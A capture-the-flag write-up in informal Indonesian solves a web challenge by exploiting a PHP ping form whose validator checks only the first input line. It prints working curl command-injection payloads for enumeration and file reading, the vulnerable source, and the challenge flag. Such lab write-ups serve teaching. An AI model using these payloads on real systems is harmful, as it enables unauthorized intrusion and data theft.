Pulse
Category: Web
Flag: grodno{55864472-ff2f-4b28-88a5-f60869e58456}
Gambaran singkat

Portal ini nyediain fitur buat ngecek reachability host internal lewat ping. Kelihatannya aman karena ada validasi input, tapi validasinya cuma ngecek baris pertama. Setelah lolos, aplikasi malah ngegabungin seluruh input mentah ke shell_exec().

Karena form ini support batch mode, baris kedua bisa dipakai buat nyisipin command shell. Dari situ kita dapet RCE sebagai www-data, terus tinggal enumerasi path internal sampai nemu file flag.

Recon awal

Halaman utama nunjukin form diagnostik biasa:

Run a short probe against internal hosts. Batch mode accepts one target per line.

Ada beberapa detail yang langsung menarik:

input menerima banyak target
target pertama dipakai buat preflight check
hasil eksekusi ditampilin ke halaman

Kalimat "The first address is used for the preflight target check." udah cukup ngasih clue kalau kemungkinan validasi cuma kena target pertama, sementara sisanya mungkin tetap ikut dieksekusi.

Test command injection

Payload paling awal yang dipakai:

curl -sS -X POST http://10.112.0.12:42834/ \
  --data-urlencode $'targets=127.0.0.1\n127.0.0.1;id'

Hasilnya:

uid=33(www-data) gid=33(www-data) groups=33(www-data)

Begitu id jalan, berarti input emang masuk ke shell dan command injection valid.

Enumerasi direktori kerja

Setelah tau ada RCE, langkah berikutnya bukan langsung nebak file flag, tapi cari dulu aplikasi ini jalan dari mana dan file apa aja yang tersedia.

Command:

curl -sS -X POST http://10.112.0.12:42834/ \
  --data-urlencode $'targets=127.0.0.1\n127.0.0.1;printf "\\n==PWD==\\n";pwd;printf "\\n==FILES==\\n";find . -maxdepth 3 -type f -printf "%M %u:%g %p\\n" 2>/dev/null'

Output penting:

==PWD==
/var/www/html

==FILES==
-rw-r--r-- root:root ./index.php
-rw-r--r-- root:root ./style.css

Source utama ada di /var/www/html/index.php, jadi itu yang dibaca dulu.

Baca source code

Command:

curl -sS -X POST http://10.112.0.12:42834/ \
  --data-urlencode $'targets=127.0.0.1\n127.0.0.1;sed -n "1,240p" /var/www/html/index.php'

Bagian source yang paling penting:

<?php
declare(strict_types=1);

const MAX_TARGET_LENGTH = 512;

$targets = '';
$result = null;
$error = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $targets = (string)($_POST['targets'] ?? '');

    if ($targets === '' || strlen($targets) > MAX_TARGET_LENGTH) {
        $error = 'Enter diagnostic targets (512 characters maximum).';
    } else {
        // The preview validator was never updated when batch mode was introduced.
        $previewTarget = explode("\n", str_replace("\r", '', $targets), 2)[0];

        if (!preg_match('/\A[a-z0-9.-]+\z/i', $previewTarget)) {
            $error = 'The first target contains invalid characters.';
        } else {
            $command = 'timeout 4 ping -c 1 -W 1 ' . $targets . ' 2>&1';
            $output = shell_exec($command);
            $result = $output === null ? 'Diagnostics finished without output.' : $output;
        }
    }
}
?>
Titik rawan

Masalahnya ada di kombinasi tiga hal ini.

1. Validasi cuma ngecek baris pertama

Kode ini cuma ngambil target pertama:

$previewTarget = explode("\n", str_replace("\r", '', $targets), 2)[0];

Artinya cuma baris pertama yang masuk proses validasi.

2. Regex cuma dipakai ke preview target
if (!preg_match('/\A[a-z0-9.-]+\z/i', $previewTarget)) {

Baris kedua dan seterusnya sama sekali gak disentuh regex.

3. Seluruh input mentah masuk ke shell
$command = 'timeout 4 ping -c 1 -W 1 ' . $targets . ' 2>&1';
$output = shell_exec($command);

Ini yang fatal. Semua input user digabung mentah ke command shell tanpa escaping. Jadi newline dan metacharacter kayak ; bisa dipakai buat nambah command baru.

Komentar developer di source malah ngasih konfirmasi langsung:

// The preview validator was never updated when batch mode was introduced.

Jadi bug ini muncul karena fitur batch mode ditambah, tapi mekanisme validasinya masih mindset single input.

Kenapa payload ini lolos

Payload yang dipakai:

127.0.0.1
127.0.0.1;id

Baris pertama valid, jadi regex lolos. Setelah itu seluruh string tetap disambung ke shell.

Secara logika, aplikasi membangun command kayak gini:

timeout 4 ping -c 1 -W 1 127.0.0.1
127.0.0.1;id 2>&1

Atau dalam parsing shell, ;id kebaca sebagai command tambahan. Yang penting di sini: validasi tidak berlaku untuk baris kedua, tapi shell tetap mengeksekusi seluruh input.

Hasil akhirnya, id jalan sebagai user web server.

Enumerasi path internal

Setelah source kebaca, target berikutnya cari file sensitif di lokasi yang biasa dipakai service internal: /run, /opt, /srv, /tmp, /var/tmp.

Command:

curl -sS -X POST http://10.112.0.12:42834/ \
  --data-urlencode $'targets=127.0.0.1\n127.0.0.1;echo "=== PROCESSES ===";ps auxww;echo "=== LISTENING ===";ss -lntup 2>/dev/null;echo "=== ROOT ===";ls -la /;echo "=== SECRETS ===";find /run /opt /srv /app /tmp /var/tmp -maxdepth 4 -type f -readable 2>/dev/null'

Temuan penting dari output:

/opt/diagnostics/jobs/43485dcd-9ba8-4643-b260-f7138ceb4a8b/flag.txt

Path ini kelihatan banget bukan file random. Struktur /opt/diagnostics/jobs/<uuid>/flag.txt cocok sama konteks aplikasi internal yang bikin job diagnostik.

Ambil flag

Begitu lokasi flag ketemu, tinggal baca file-nya langsung.

Command:

curl -sS -X POST http://10.112.0.12:42834/ \
  --data-urlencode $'targets=127.0.0.1\n127.0.0.1;cat /opt/diagnostics/jobs/43485dcd-9ba8-4643-b260-f7138ceb4a8b/flag.txt'

Output:

grodno{55864472-ff2f-4b28-88a5-f60869e58456}
